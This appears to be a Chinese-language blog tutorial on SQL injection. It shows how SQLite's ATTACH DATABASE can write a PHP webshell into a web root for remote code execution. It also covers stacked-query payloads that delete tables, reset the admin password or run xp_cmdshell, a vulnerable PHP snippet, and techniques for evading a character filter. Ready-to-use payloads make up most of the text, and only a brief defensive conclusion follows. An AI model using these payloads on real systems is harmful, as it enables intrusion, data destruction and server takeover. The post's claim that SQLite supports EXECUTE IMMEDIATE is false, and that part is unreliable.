---
title: SQLite RCE 與 Stacked Queries 攻擊筆記
tags: [SQLite, RCE, SQL Injection, Stacked Queries]
published: 2025-02-04
category: 教學
draft: false
password: sqlite
abstract: "沒情商人的人 這技術不就是全部疊在一起嗎? 有情商的人 : Stacked Queries"
message: 就跟你講吧 ! 密碼是 sqlite
---

# SQLite Remote Code Execution（RCE）與 Stacked Queries 攻擊筆記

本文將整合以下重點內容，幫助你快速理解並記錄：
1. **SQLite RCE**：利用 `ATTACH DATABASE` 與檔案寫入特性實現遠端程式碼執行（Remote Code Execution）。
2. **Stacked Queries（堆疊查詢）**：如何在一次注入中執行多條 SQL 語句，如 `INSERT`、`DELETE`、`CALL`、`EXEC` 等。
3. **原始程式碼脆弱點**：不安全的 SQL 拼接方式。
4. **繞過過濾規則**：如果有一個正規表達式（`/[+*{}',;<>()\\[\\]\\/\\:]/`）阻擋特定字元，可藉由編碼、函式組合等方式繞過。

---

## 一、SQLite RCE 攻擊：`ATTACH DATABASE` + 寫入惡意 PHP

### 1. 攻擊示例程式碼

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

ATTACH DATABASE：在 SQLite 中，可將任意路徑掛載為資料庫檔。

CREATE TABLE：在被掛載的「lol」資料庫裡，建立一個名為 pwn 的表，欄位為 dataz text。

INSERT：將` <?php system($_GET['cmd']); ?> `寫進這個掛載的檔案（lol.php），最終形成能被 PHP 解譯的惡意程式碼。

2. RCE 達成原因

    SQLite 可掛載任何檔案：即使該檔案其實是 PHP 程式，而非真正的 .db。
    Web Server 解譯執行 PHP：lol.php 只要被存放在可執行 PHP 的目錄（如 /var/www/），即可透過瀏覽器訪問並帶上 ?cmd=... 達到 遠端指令執行（RCE）。

3. 攻擊條件

    目標環境使用 SQLite。
    檔案系統、Web Server 允許在 /var/www/ 下寫入檔案或修改檔案。
    程式／PDO 允許執行「多條 SQL」的堆疊查詢（Stacked Queries）。

二、Stacked Queries（堆疊查詢）概念
1. 什麼是 Stacked Queries？

在一次 SQL 呼叫中，使用 ; 分隔多條獨立指令。

例如：
```
SELECT * FROM products WHERE productid=1; DELETE FROM products;
```

可以執行 INSERT、UPDATE、DELETE、DROP、EXEC、CALL 等操作，不再只局限於 SELECT。

2. 常見攻擊方式

    刪除資料：

1; DELETE FROM products

若原本程式是：
```
SELECT * FROM products WHERE productid=[User_Input]
```
拼接後成：
```
SELECT * FROM products WHERE productid=1; DELETE FROM products
```
執行完後，整個 products 表皆被刪除。

修改資料（改管理者密碼）：
```
1; UPDATE members SET password='pwd' WHERE username='admin'
```
直接在同一次查詢中更新任意帳號密碼。

呼叫儲存程序 / 系統函式（以 SQL Server 為例）：

    1; exec master..xp_cmdshell 'DEL important_file.txt'

    可在作業系統層級刪除檔案，甚至執行更進一步的惡意命令。

3. 限制

    不同資料庫/不同 API 支援度：MySQL + PHP（PDO）通常預設不支援堆疊查詢；SQL Server 幾乎支援；SQLite 依版本與驅動設定而異。
    權限不足：若資料庫使用者權限有限，也可能無法成功執行 DROP TABLE 或系統函式。
    需要資訊蒐集：攻擊者須事先知道資料表結構、欄位名稱、儲存程序名稱等。

三、PHP 範例程式中的漏洞分析

以下是一段示例程式，只有在使用者 ``` $_SESSION['username'] ``` 為 axel 時，才會執行插入與刪除操作：

```
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>
```

**風險點：$cat_name 直接以 字串拼接 方式進入 SQL**

```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
```

攻擊者可注入惡意字串，例如：

```sql
'); DROP TABLE accepted_cats;--
```

此時 SQL 會變成：

```
INSERT INTO accepted_cats (name) VALUES (''); DROP TABLE accepted_cats;--')
```

堆疊查詢可行：若 PDO 與 SQLite 環境允許一次執行多條查詢，就可以串接更多指令，例如：

```
 '); ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); ...
```

前提：攻擊者需要拿到 axel 的 Session 或能以 axel 身分發送 POST。否則程式不會跑這段邏輯。

四、繞過字元過濾：```$forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";```

有時程式員會用 Regex 過濾特定符號。例如阻擋：+ * { } ' , ; < > ( ) [ ] / :。
攻擊者可用下列思路嘗試「繞過」：

多重編碼
*  URL 編碼：( → %28，/ → %2F，; → %3B…
*  HTML 實體：( → &#40;，; → &#59;…
*  Unicode 逃逸：( → \u0028…
如果應用程式只在「原始字串」階段檢查，之後自動解碼卻沒再比對，就          能「先繞再解」。

在資料庫端用函式生成字元
SQLite 可用 char(…) 或 x'…' 拼接字元。例如：

`SELECT char(59);` -- 產生` ';' `

或使用``` EXECUTE IMMEDIATE (SQLite 3.20+)：```

```sql
EXECUTE IMMEDIATE 'ATTACH DATABASE "/var/www/lol.php" AS lol';
```

前提是能在語法層先繞過 (、)、; 等被禁止字元，可透過編碼、二次解碼等方式實現。

* **改用雙引號 / 其他引號**
有時候 " 未被禁，但 ' 被禁。SQLite 在鬆散模式下，" 也能包住字串。

* **分段注入**
先在資料表寫一部分字串，下次再把它讀出來接著執行。或使用 PRAGMA writable_schema=1 等非常技巧。

## 核心結論

只靠單純的 Regex 過濾往往防不勝防。

更安全的做法：
參數化查詢（Prepared Statements），避免在 SQL 中直接拼接使用者輸入。

## 總結

* **SQLite RCE**
        攻擊手法：ATTACH DATABASE → 建立表 → 寫入 PHP 碼 → Web Server 解譯執行 → RCE。
        條件：必須真的能寫入 /var/www/ 並能執行 .php。

* **Stacked Queries**
        一次執行多條查詢，威力十足：增刪改、呼叫系統函式、DROP 表格等。
        支援度依資料庫與 API 而異。

* **PHP 程式漏洞**
        $_SESSION['username'] === 'axel' → 權限夠高，危險操作無法可防。
        $cat_name 未參數化 → SQL Injection 大門敞開。

* **繞過過濾**
        編碼技術、資料庫函式、雙引號替代等方法，都可能逃脫單純 Regex 的阻攔。
        根本防禦：使用 Prepared Statements，並限制檔案寫入權限、正確設定 Web Server。